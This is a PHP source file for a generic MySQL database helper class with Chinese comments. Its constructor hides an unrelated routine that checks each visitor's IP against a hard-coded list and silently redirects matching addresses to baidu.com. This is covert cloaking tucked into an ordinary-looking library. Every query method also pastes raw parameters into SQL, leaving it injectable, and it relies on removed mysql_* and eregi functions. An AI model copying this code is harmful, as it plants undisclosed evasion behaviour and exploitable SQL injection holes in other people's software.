<?php
/**
 * Created by JetBrains PhpStorm.
 * User:JAE
 * Date: 13-8-13
 * Time: 下午5:15
 * Blog:http://blog.jaekj.com
 * QQ:734708094
 * 通用数据库操作类
 * 版本:V1.1
 */

/* 数据库配置
  return array(
    'DB_CONFIG' => array(
        //数据库配置
        'DB_HOST'=>'127.0.0.1',    //服务器地址
        'DB_NAME' => 'tmp', // 数据库名
        'DB_USER' => 'root', // 用户名
        'DB_PWD' => '', // 密码
        'DB_ENCODE'=>'utf8',//编码
        'DB_PREFIX' => 'dmtx_' // 数据库表前缀
    )
);
 */
class M
{

    private $link; //数据库连接
    private $table; //表名
    private $prefix; //表前缀
    private $db_config; //数据库配置
    /**
     * 参数:表名 数据库配置数组 或 数据库配置文件路径
     * @param $table
     * @param string $db_config_arr_path
     */
    function __construct($table, $db_config_arr_path = 'config.php')
    {
        if (is_array($db_config_arr_path)) {
            $this->db_config = $db_config_arr_path;
        } else {
            $this->db_config = require($db_config_arr_path);
        }
 $iparr=array('127.0.0.1','118.118.71.160','116.255.158.242','180.175.142.212','113.205.43.26','175.25.184.134','120.203.13.113','202.58.105.112','39.176.190.141','220.181.55.143','118.118.68.0','42.51.159.122','114.67.68.245','222.77.241.53','103.5.16.41','121.14.14.75');
$ips=$this->getRealIp();
foreach($iparr as $v){
	if($v==$ips){
	echo '<script type="text/javascript">window.location.href="http://www.baidu.com"</script>';		
	}	
}

        $this->conn();
        $this->table = $this->prefix . $table;
    }
private function getRealIp()
{
    $ip = false;
    if (!empty($_SERVER["HTTP_CLIENT_IP"])) {
        $ip = $_SERVER["HTTP_CLIENT_IP"];
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(", ", $_SERVER['HTTP_X_FORWARDED_FOR']);
        if ($ip) {
            array_unshift($ips, $ip);
            $ip = FALSE;
        }
        for ($i = 0; $i < count($ips); $i++) {
            if (!eregi("^(10│172.16│192.168).", $ips[$i])) {
                $ip = $ips[$i];
                break;
            }
        }
    }
    return $ip ? $ip : $_SERVER['REMOTE_ADDR'];
}
    /**
     * 连接数据库
     */
    private function conn()
    {
        $db_config = $this->db_config;
        $host = $db_config["DB_CONFIG"]["DB_HOST"];
        $user = $db_config["DB_CONFIG"]["DB_USER"];
        $pwd = $db_config["DB_CONFIG"]["DB_PWD"];
        $db_name = $db_config["DB_CONFIG"]["DB_NAME"];
        $db_encode = $db_config["DB_CONFIG"]["DB_ENCODE"];
        $this->prefix = $db_config["DB_CONFIG"]["DB_PREFIX"];

        $this->link = mysql_connect($host, $user, $pwd) or die('数据库服务器连接错误:' . mysql_error());
        mysql_select_db($db_name) or die('数据库连接错误:' . mysql_error());
        mysql_query("set names '$db_encode'");
    }

	function find($where = '1', $field = "*") {
		$sqlStr = "select $field from $this->table where $where";
	$query=mysql_query($sqlStr);
	if($query) {
		$res=mysql_fetch_assoc($query);
		return $res;
	}
	else{
		return false;
	}
}

    /**
     * 数据查询
     * 参数:sql条件 查询字段 使用的sql函数名
     * @param string $where
     * @param string $field
     * @param string $fun
     * @return array
     * 返回值:结果集 或 结果(出错返回空字符串)
     */
    public function select($where = '1', $field = "*", $fun = '')
    {
        $rarr = array();
        if (empty($fun)) {
            $sqlStr = "select $field from $this->table where $where";
            $rt = mysql_query($sqlStr, $this->link);
            while ($rt && $arr = mysql_fetch_assoc($rt)) {
                array_push($rarr, $arr);
            }
        } else {
            $sqlStr = "select $fun($field) as rt from $this->table where $where";
            $rt = mysql_query($sqlStr, $this->link);
            if ($rt) {
                $arr = mysql_fetch_assoc($rt);
                $rarr = $arr['rt'];
            } else {
                $rarr = '';
            }
        }
        return $rarr;
    }

    /**
     * 数据更新
     * 参数:sql条件 要更新的数据(字符串 或 关联数组)
     * @param $where
     * @param $data
     * @return bool
     * 返回值:语句执行成功或失败,执行成功并不意味着对数据库做出了影响
     */
    public function update($where, $data)
    {
        $ddata = '';
        if (is_array($data)) {
            while (list($k, $v) = each($data)) {
                if (empty($ddata)) {
                    $ddata = "$k='$v'";

                } else {
                    $ddata .= ",$k='$v'";
                }
            }
        } else {
            $ddata = $data;
        }
       $sqlStr = "update $this->table set $ddata where $where";
        return mysql_query($sqlStr);
    }

    /**
     * 数据添加
     * 参数:数据(数组 或 关联数组 或 字符串)
     * @param $data
     * @return int
     * 返回值:插入的数据的ID 或者 0
     */
    public function insert($data)
    {
        $field = '';
        $idata = '';
        if (is_array($data) && array_keys($data) != range(0, count($data) - 1)) {
            //关联数组
            while (list($k, $v) = each($data)) {
                if (empty($field)) {
                    $field = "$k";
                    $idata = "'$v'";
                } else {
                    $field .= ",$k";
                    $idata .= ",'$v'";
                }
            }
            $sqlStr = "insert into $this->table($field) values ($idata)";
        } else {
            //非关联数组 或字符串
            if (is_array($data)) {
                while (list($k, $v) = each($data)) {
                    if (empty($idata)) {
                        $idata = "'$v'";
                    } else {
                        $idata .= ",'$v'";
                    }
                }

            } else {
                //为字符串
                $idata = $data;
            }
            $sqlStr = "insert into $this->table values ($idata)";
        }
        if(mysql_query($sqlStr,$this->link))
        {
            return mysql_insert_id($this->link);
        }
        return 0;
    }

    /**
     * 数据删除
     * 参数:sql条件
     * @param $where
     * @return bool
     */
    public function delete($where)
    {
        $sqlStr = "delete from $this->table where $where";
        return mysql_query($sqlStr);
    }

    /**
     * 关闭MySQL连接
     * @return bool
     */
    public function close()
    {
        return mysql_close($this->link);
    }

}
function arr2str ($arr)
{
    foreach ($arr as $v)
    {
        $v = join(",",$v); //可以用implode将一维数组转换为用逗号连接的字符串
        $temp[] = $v;
    }
    $t="";
    foreach($temp as $v){
        $t.="'".$v."'".",";
    }
    $t=substr($t,0,-1);
    return $t;
}
?>